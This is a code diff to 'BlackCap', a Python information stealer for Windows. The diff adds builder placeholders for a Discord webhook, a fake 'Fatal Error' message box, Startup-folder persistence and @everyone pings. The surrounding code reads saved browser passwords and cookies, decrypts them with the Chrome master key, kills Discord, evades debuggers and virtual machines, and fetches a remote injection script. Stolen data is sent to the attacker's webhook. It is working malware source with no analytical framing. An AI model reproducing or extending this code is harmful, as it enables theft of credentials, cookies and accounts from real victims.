@@ -1,5 +1,4 @@
 import asyncio
-import ctypes
 import json
 import ntpath
 import os
@@ -9,7 +8,6 @@ import shutil
 import sqlite3
 import subprocess
 import threading
-from sqlite3 import connect as sql_connect
 import winreg
 import zipfile
 import httpx
@@ -18,14 +16,18 @@ import win32gui
 import win32con
 import base64
 import requests
+import ctypes
 import time
 
+
+from sqlite3 import connect
 from base64 import b64decode
 from urllib.request import Request, urlopen
+from shutil import copy2
 from datetime import datetime, timedelta, timezone
 from sys import argv
 from tempfile import gettempdir, mkdtemp
-from json import loads as json_loads, dumps
+from json import loads, dumps
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
 from Crypto.Cipher import AES
 from PIL import ImageGrab
@@ -49,12 +51,17 @@ Passw = [];
 # `
 
 
+
 __config__ = {
-    'yourwebhookurl': "Place your webhook here",
+    'yourwebhookurl': "%WEBHOOK_HERE%",
     'blackcap_inject_url': "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Inject/main/index.js",
-    'hide': 'no',
-    'kill_discord_process': True,
-    'dbugkiller': True,
+    'hide': '%_hide_script%',
+    'ping': '%ping_enabled%',
+    'pingtype': '%ping_type%',
+    'fake_error':'%_error_enabled%',
+    'startup': '%_startup_enabled%',
+    'kill_discord_process': "%kill_discord_process%",
+    'dbugkiller': '%_debugkiller%',
     'blprggg':
     [
         "httpdebuggerui",
@@ -208,6 +215,14 @@ class bl4ckc4p(Functions):
 
         self.hide = self.fetch_conf("hide")
 
+        self.pingtype = self.fetch_conf("pingtype")
+
+        self.pingonrun = self.fetch_conf("ping")
+
+        self.startupexe = self.fetch_conf("startup")
+        
+        self.fake_error = self.fetch_conf("fake_error")
+
         self.appdata = os.getenv("localappdata")
 
         self.roaming = os.getenv("appdata")
@@ -248,9 +263,41 @@ class bl4ckc4p(Functions):
 
 
     def hiding(self: str) -> str:
-        if self.hide == "" or self.hide == "yes":
+        if self.hide == "yes":
             hide = win32gui.GetForegroundWindow()
             win32gui.ShowWindow(hide, win32con.SW_HIDE)
+
+    def fakeerror(self: str) -> str:
+        if self.fake_error == "yes":
+            ctypes.windll.user32.MessageBoxW(None, 'Error code: BlackCap_0x988958\nSomething gone wrong.', 'Fatal Error', 0)
+
+    def pingonrunning(self: str) -> str:
+        ping1 = {
+            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'content': "@everyone"
+            }
+        ping2 = {
+            'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
+            'content': "@here"
+            }
+        if self.pingonrun == "yes":
+            if self.h00ksreg in self.w3bh00k:
+                if self.pingtype == "@everyone" or self.pingtype == "everyone":
+                    httpx.post(self.w3bh00k, json=ping1)
+            if self.pingtype == "@here" or self.pingtype == "here":
+                if self.h00ksreg in self.w3bh00k :
+                    httpx.post(self.w3bh00k, json=ping2)
+
+
+
+    def startupblackcap(self: str) -> str:
+        if self.startupexe == "yes":
+            startup_path = os.getenv("appdata") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+            if os.path.exists(startup_path + argv[0]):
+                os.remove(startup_path + argv[0])
+                copy2(argv[0], startup_path)
+            else:
+                copy2(argv[0], startup_path)
 
 
     def _bexit(self):
@@ -267,9 +314,14 @@ class bl4ckc4p(Functions):
         return wrapper
 
     async def init(self):
-        self.hiding()
+
         if self.w3bh00k == "" or self.w3bh00k == "\x57EBHOOK_HERE":
             self._bexit()
+            
+        self.hiding()
+        self.fakeerror()
+        self.pingonrunning()
+        self.startupblackcap()
 
         if self.fetch_conf('dbugkiller') and AntiDebug().inVM is True:
 
@@ -736,6 +788,7 @@ GoogleMaps: {self.googlemap}
         fileCount = f"{file_count} Files Found: "
 
         embed = {
+            'name': "Blackcap",
             'avatar_url': 'https://media.discordapp.net/attachments/1023241847046418522/1032289976710352917/blackcap_2.png',
             'embeds': [
                 {
@@ -1111,7 +1164,7 @@ def getPassw(path, arg):
 
     tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
     shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
+    conn = connect(tempfold)
     cursor = conn.cursor()
     cursor.execute("SELECT action_url, username_value, password_value FROM logins;")
     data = cursor.fetchall()
@@ -1120,7 +1173,7 @@ def getPassw(path, arg):
     os.remove(tempfold)
 
     pathKey = path + "/Local State"
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
 
@@ -1147,7 +1200,7 @@ def getCookie(path, arg):
     tempfold = temp + "blackcaped" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + ".db"
 
     shutil.copy2(pathC, tempfold)
-    conn = sql_connect(tempfold)
+    conn = connect(tempfold)
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
     data = cursor.fetchall()
@@ -1157,7 +1210,7 @@ def getCookie(path, arg):
 
     pathKey = path + "/Local State"
 
-    with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())
+    with open(pathKey, 'r', encoding='utf-8') as f: local_state = loads(f.read())
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
 
